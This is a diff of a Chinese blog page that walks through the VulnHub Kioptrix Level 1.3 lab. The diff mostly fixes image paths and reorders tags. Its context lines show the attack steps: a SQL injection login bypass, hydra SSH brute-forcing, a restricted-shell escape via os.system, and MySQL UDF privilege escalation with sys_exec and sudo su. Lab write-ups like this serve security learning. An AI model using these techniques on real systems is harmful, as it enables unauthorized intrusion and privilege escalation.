@@ -17,19 +17,19 @@
 <meta property="og:site_name" content="zhou">
 <meta property="og:description" content="环境镜像下载地址：kioptrix level1.3">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-level1-3/1.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-level1-3/2.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-level1-3/3.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-level1-3/4.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-level1-3/5.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-level1-3/6.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-level1-3/7.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-level1-3/kioptrix-level1-3/1.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-level1-3/kioptrix-level1-3/2.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-level1-3/kioptrix-level1-3/3.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-level1-3/kioptrix-level1-3/4.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-level1-3/kioptrix-level1-3/5.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-level1-3/kioptrix-level1-3/6.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/kioptrix-level1-3/kioptrix-level1-3/7.png">
 <meta property="article:published_time" content="2024-09-08T06:10:32.000Z">
-<meta property="article:modified_time" content="2024-09-08T08:51:18.755Z">
+<meta property="article:modified_time" content="2024-09-09T06:42:41.646Z">
 <meta property="article:author" content="zhoupeng">
 <meta property="article:tag" content="VulnHub靶场">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://blog.zyp0422.mom/kioptrix-level1-3/1.png">
+<meta name="twitter:image" content="https://blog.zyp0422.mom/kioptrix-level1-3/kioptrix-level1-3/1.png">
   
     <link rel="alternative" href="/atom.xml" title="zhou" type="application/atom+xml">
   
@@ -399,7 +399,7 @@
 
 <p>靶机目标：获得靶机root权限</p>
 <h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>这个靶机与之前靶机不一样，它不是直接给完整的镜像，而是给了一个磁盘，这时候需要我们自己创建一个新虚拟机，然后应用题目的虚拟磁盘，如下图</p>
-<p><img src="/kioptrix-level1-3/1.png"></p>
+<p><img src="/kioptrix-level1-3/kioptrix-level1-3/1.png"></p>
 <p>选择现有虚拟磁盘，然后选择我们下载的那个磁盘，网络状态保持现状即可</p>
 <h3 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h3><p>做了这么多，发现arp-scan真的很好用，扫描快使，且能够很快辨别出那个是靶机IP</p>
 <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">arp-scan</span> <span class="selector-tag">-l</span></span><br></pre></td></tr></table></figure>
@@ -413,7 +413,7 @@
 
 <p>开放了22、80、139、445</p>
 <h3 id="网站信息收集及利用"><a href="#网站信息收集及利用" class="headerlink" title="网站信息收集及利用"></a>网站信息收集及利用</h3><p>访问80端口</p>
-<p><img src="/kioptrix-level1-3/2.png"></p>
+<p><img src="/kioptrix-level1-3/kioptrix-level1-3/2.png"></p>
 <p>发现存在登录入口，尝试sqlmap发现不存在sql注入</p>
 <p>使用万能密码</p>
 <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">admin</span>&#x27; <span class="selector-tag">or</span> &#x27;<span class="number">1</span>&#x27;=&#x27;<span class="number">1</span></span><br></pre></td></tr></table></figure>
@@ -421,9 +421,9 @@
 <p>网站跳转至下面url</p>
 <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.114/member.php?username=admin</span><br></pre></td></tr></table></figure>
 
-<p><img src="/kioptrix-level1-3/3.png"></p>
+<p><img src="/kioptrix-level1-3/kioptrix-level1-3/3.png"></p>
 <p>发现将我们的admin打印出来，尝试ssti，发现不存在ssti漏洞</p>
-<p><img src="/kioptrix-level1-3/4.png"></p>
+<p><img src="/kioptrix-level1-3/kioptrix-level1-3/4.png"></p>
 <p>通过bp，进行探测也没发现什么</p>
 <h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><h4 id="dirb"><a href="#dirb" class="headerlink" title="dirb"></a>dirb</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(<span class="selector-tag">root</span>💀<span class="selector-class">.kali</span>)<span class="selector-tag">-</span><span class="selector-attr">[~]</span></span><br><span class="line">└─# <span class="selector-tag">dirb</span> <span class="selector-tag">http</span>:<span class="comment">//192.168.1.114</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">-----------------</span></span><br><span class="line"><span class="selector-tag">DIRB</span> <span class="selector-tag">v2</span><span class="selector-class">.22</span>    </span><br><span class="line"><span class="selector-tag">By</span> <span class="selector-tag">The</span> <span class="selector-tag">Dark</span> <span class="selector-tag">Raver</span></span><br><span class="line"><span class="selector-tag">-----------------</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">START_TIME</span>: <span class="selector-tag">Sun</span> <span class="selector-tag">Sep</span>  <span class="number">8</span> <span class="number">14</span>:<span class="number">29</span>:<span class="number">21</span> <span class="number">2024</span></span><br><span class="line"><span class="selector-tag">URL_BASE</span>: <span class="selector-tag">http</span>:<span class="comment">//192.168.1.114/</span></span><br><span class="line"><span class="selector-tag">WORDLIST_FILES</span>: /<span class="selector-tag">usr</span>/<span class="selector-tag">share</span>/<span class="selector-tag">dirb</span>/<span class="selector-tag">wordlists</span>/<span class="selector-tag">common</span><span class="selector-class">.txt</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">-----------------</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">GENERATED</span> <span class="selector-tag">WORDS</span>: <span class="number">4612</span>                                                          </span><br><span class="line"></span><br><span class="line"><span class="selector-tag">----</span> <span class="selector-tag">Scanning</span> <span class="selector-tag">URL</span>: <span class="selector-tag">http</span>:<span class="comment">//192.168.1.114/ ----</span></span><br><span class="line">+ <span class="selector-tag">http</span>:<span class="comment">//192.168.1.114/cgi-bin/ (CODE:403|SIZE:328)                                                                                                   </span></span><br><span class="line">==&gt; <span class="selector-tag">DIRECTORY</span>: <span class="selector-tag">http</span>:<span class="comment">//192.168.1.114/images/                                                                                                           </span></span><br><span class="line">+ <span class="selector-tag">http</span>:<span class="comment">//192.168.1.114/index (CODE:200|SIZE:1255)                                                                                                     </span></span><br><span class="line">+ <span class="selector-tag">http</span>:<span class="comment">//192.168.1.114/index.php (CODE:200|SIZE:1255)                                                                                                 </span></span><br><span class="line">==&gt; <span class="selector-tag">DIRECTORY</span>: <span class="selector-tag">http</span>:<span class="comment">//192.168.1.114/john/                                                                                                             </span></span><br><span class="line">+ <span class="selector-tag">http</span>:<span class="comment">//192.168.1.114/logout (CODE:302|SIZE:0)                                                                                                       </span></span><br><span class="line">+ <span class="selector-tag">http</span>:<span class="comment">//192.168.1.114/member (CODE:302|SIZE:220)                                                                                                     </span></span><br><span class="line">+ <span class="selector-tag">http</span>:<span class="comment">//192.168.1.114/server-status (CODE:403|SIZE:333)                                                                                              </span></span><br><span class="line">                                                                                                                                 </span><br></pre></td></tr></table></figure>
 
@@ -439,7 +439,7 @@
 <h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>通过万能密码登录网站发现显示了密码</p>
 <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">admin</span>&#x27; <span class="selector-tag">or</span> &#x27;<span class="number">1</span>&#x27;=&#x27;<span class="number">1</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/kioptrix-level1-3/5.png"></p>
+<p><img src="/kioptrix-level1-3/kioptrix-level1-3/5.png"></p>
 <h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>直接爆破</p>
 <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">hydra</span> <span class="selector-tag">-1</span> <span class="selector-tag">John</span> <span class="selector-tag">-P</span> /<span class="selector-tag">usr</span>/<span class="selector-tag">share</span>/<span class="selector-tag">wordlists</span>/<span class="selector-tag">rockyou</span><span class="selector-class">.txt</span> <span class="selector-tag">ssh</span>:<span class="comment">//192.168.1.162:22 -f</span></span><br></pre></td></tr></table></figure>
 
@@ -451,7 +451,7 @@
 <p>失败、</p>
 <h4 id="echo调用os模块"><a href="#echo调用os模块" class="headerlink" title="echo调用os模块"></a>echo调用os模块</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo os.system(&quot;/bin/bash&quot;)</span><br></pre></td></tr></table></figure>
 
-<p><img src="/kioptrix-level1-3/6.png"></p>
+<p><img src="/kioptrix-level1-3/kioptrix-level1-3/6.png"></p>
 <h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="Linux内核提权"><a href="#Linux内核提权" class="headerlink" title="Linux内核提权"></a>Linux内核提权</h4><p>行不通，本来跟level1.2一样的版本，当时目标机器没有gcc</p>
 <p>提权这里知道的都试了，难住了，根据网上的提权复现的</p>
 <h4 id="mysql-UDF提权"><a href="#mysql-UDF提权" class="headerlink" title="mysql-UDF提权"></a>mysql-UDF提权</h4><p>信息收集时发现mysql下root没有密码</p>
@@ -459,7 +459,7 @@
 
 <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">use</span> <span class="selector-tag">mysql</span>;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">select</span> * <span class="selector-tag">from</span> <span class="selector-tag">func</span>;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">select</span> <span class="selector-tag">sys_exec</span>(<span class="string">&#x27;usermod -a -G admin john&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">exit</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">sudo</span> <span class="selector-tag">su</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/kioptrix-level1-3/7.png"></p>
+<p><img src="/kioptrix-level1-3/kioptrix-level1-3/7.png"></p>
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
 <li>新的交互终端方式、终端模式</li>
 <li>MySQL-UDF提权</li>
@@ -817,15 +817,15 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">文件上传</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">kali</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">SSTI</a>
+                <a href="javascript:void(0)" class="js-tag color5">文件上传</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">XSS</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -841,7 +841,7 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">XSS</a>
+                <a href="javascript:void(0)" class="js-tag color5">SSTI</a>
               </li>
              
               <li class="article-tag-list-item">
